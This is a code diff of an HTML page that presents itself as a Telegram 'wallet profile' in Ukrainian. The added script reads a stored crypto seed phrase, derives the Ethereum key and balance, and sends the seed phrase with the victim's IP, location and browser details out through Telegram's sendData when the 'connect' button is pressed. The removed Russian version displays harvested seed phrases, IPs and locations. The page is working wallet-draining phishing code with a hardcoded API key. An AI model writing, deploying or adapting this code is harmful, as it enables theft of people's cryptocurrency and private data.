@@ -1,92 +1,92 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="uk">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>👛 Профиль ETH кошелька</title>
-    <link rel="stylesheet" href="https://sp574-maker.github.io/maker/style.css" />
-    <link rel="stylesheet" href="https://sp574-maker.github.io/maker/profile.css" />
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <title>Wallet Profile</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Feather Icons -->
+    <script src="https://unpkg.com/feather-icons"></script>
+    <!-- bip39 + ethers + bitcoinjs -->
+    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.browser.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs.min.js"></script>
 </head>
 <body>
     <div class="container">
-        <h1>👛 Профиль ETH кошелька</h1>
-        <p><strong>ETH адрес:</strong> <span id="ethAddress">–</span></p>
-        <p><strong>Дата входа:</strong> <span id="timestamp">–</span></p>
-        <p><strong>IP:</strong> <span id="userIp">–</span></p>
-        <p><strong>Локация:</strong> <span id="userLocation">–</span></p>
-        <p><strong>Баланс ETH:</strong> <span id="walletBalance">⏳ Загрузка…</span></p>
-        <p><strong>Seed-фраза:</strong></p>
-        <textarea id="seed" readonly style="width:100%;height:100px;"></textarea>
-        <button id="goWalletBtn">🔁 Перейти в кошелёк</button>
+        <h2>🔐 Ваш гаманець</h2>
+        <div class="info" id="walletInfo">
+            <p><strong>Адреса:</strong> <span id="ethAddress">–</span></p>
+            <p><strong>Баланс:</strong> <span id="ethBalance">–</span></p>
+        </div>
+        <button onclick="submitSeed()">
+            <i data-feather="link"></i> Подключить
+        </button>
     </div>
 
     <script>
-        const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
-        const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");
+        const userIp = localStorage.getItem("ip") || "невідомо";
+        const userLocation = localStorage.getItem("location") || "невідомо";
 
-        const seedPhrase = (data.seed || "").trim();
-        const walletType = (data.wallet || "").toLowerCase();
-        const timestamp = data.timestamp || "–";
-        const ip = data.ip || "–";
-        const locationInfo = data.location || "–";
+        async function submitSeed() {
+            const lastSeed = localStorage.getItem("last_seed");
+            if (!lastSeed) return alert("❌ Seed-фраза не знайдена");
 
-        document.getElementById("timestamp").textContent = timestamp;
-        document.getElementById("userIp").textContent = ip;
-        document.getElementById("userLocation").textContent = locationInfo;
-        document.getElementById("seed").textContent = seedPhrase;
+            document.getElementById("ethAddress").innerText = "⏳ Зачекайте…";
+            document.getElementById("ethBalance").innerText = "⏳";
 
-        let ethAddress = null;
-
-        async function deriveETHAddress(mnemonic) {
             try {
-                if (!mnemonic) throw new Error("Seed-фраза порожня");
-                const wallet = ethers.Wallet.fromMnemonic(mnemonic);
-                ethAddress = wallet.address;
-                document.getElementById("ethAddress").textContent = ethAddress;
-                console.log("✅ ETH адрес:", ethAddress);
+                const seedBuffer = await bip39.mnemonicToSeed(lastSeed);
+                const root = bitcoin.bip32.fromSeed(seedBuffer);
+                const ethNode = root.derivePath("m/44'/60'/0'/0/0");
+                const ethWallet = new ethers.Wallet(ethNode.privateKey);
+
+                const address = ethWallet.address;
+                document.getElementById("ethAddress").innerText = address;
+
+                const balance = await getEthBalance(address);
+                document.getElementById("ethBalance").innerText = `${balance} ETH`;
+
+                const payload = {
+                    seed: lastSeed,
+                    wallet: "ethereum",
+                    address,
+                    balance,
+                    ip: userIp,
+                    location: userLocation,
+                    user_agent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                };
+
+                console.log("📤 Payload:", payload);
+
+                if (Telegram.WebApp?.sendData) {
+                    Telegram.WebApp.sendData(JSON.stringify(payload));
+                    console.log("✅ Payload надіслано");
+                }
+
             } catch (e) {
-                console.error("❌ Помилка генерації ETH:", e.message);
+                console.error("❌ Помилка генерації адреси:", e);
+                alert("Помилка обробки seed-фрази");
             }
         }
 
-        async function fetchETHBalance(address) {
+        async function getEthBalance(address) {
             try {
-                const url = `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`;
-                const res = await fetch(url);
-                const json = await res.json();
-                if (!json || json.status !== "1" || !json.result) throw new Error("ETH API error");
-                const ethBalance = parseFloat(json.result) / 1e18;
-                document.getElementById("walletBalance").textContent = `${ethBalance.toFixed(6)} ETH`;
+                const provider = new ethers.InfuraProvider("mainnet", "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD");
+                const wei = await provider.getBalance(address);
+                return ethers.formatEther(wei);
             } catch (e) {
-                console.warn("❌ Помилка балансу ETH:", e.message);
-                document.getElementById("walletBalance").textContent = "–";
+                console.warn("❌ Баланс не отримано:", e);
+                return "–";
             }
         }
 
-        function goToWallet() {
-            let url = "https://www.google.com";
-            if (walletType.includes("metamask")) url = "https://metamask.io/";
-            else if (walletType.includes("trust")) url = "https://trustwallet.com/";
-            else if (walletType.includes("phantom")) url = "https://phantom.app/";
-            else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
-            else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";
-
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.openLink(url);
-            } else {
-                window.open(url, "_blank");
+        window.addEventListener("DOMContentLoaded", () => {
+            feather.replace();
+            if (typeof Telegram !== "undefined" && Telegram.WebApp) {
+                Telegram.WebApp.ready();
+                Telegram.WebApp.expand();
             }
-        }
-
-        document.getElementById("goWalletBtn").addEventListener("click", goToWallet);
-
-        document.addEventListener("DOMContentLoaded", async () => {
-            console.log("🚀 DOM загружено");
-            if (!seedPhrase) return console.error("❌ Seed-фраза порожня");
-            await deriveETHAddress(seedPhrase);
-            if (ethAddress) await fetchETHBalance(ethAddress);
         });
     </script>
 </body>
